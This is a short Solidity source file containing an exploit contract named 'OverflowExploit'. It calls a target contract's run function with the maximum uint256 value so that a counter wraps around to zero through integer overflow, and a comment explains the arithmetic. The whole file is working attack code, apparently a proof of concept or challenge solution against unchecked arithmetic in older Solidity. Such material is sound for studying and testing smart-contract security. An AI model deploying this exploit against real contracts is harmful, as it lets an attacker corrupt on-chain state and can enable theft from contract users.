pragma solidity ^0.4.19;

interface IVulnerable {
    function run(uint256 input) external;
    function count() external view returns (uint256);
}

contract OverflowExploit {
    IVulnerable public target;

    constructor(address _target) public {
        target = IVulnerable(_target);
    }

    function attack() public {
        // cause overflow: count = 1 + (2^256 - 1) = 0 (wrap around)
        uint256 overflowInput = ~uint256(0); // equals 2^256 - 1
        target.run(overflowInput);
    }

    function getCount() public view returns (uint256) {
        return target.count();
    }
}

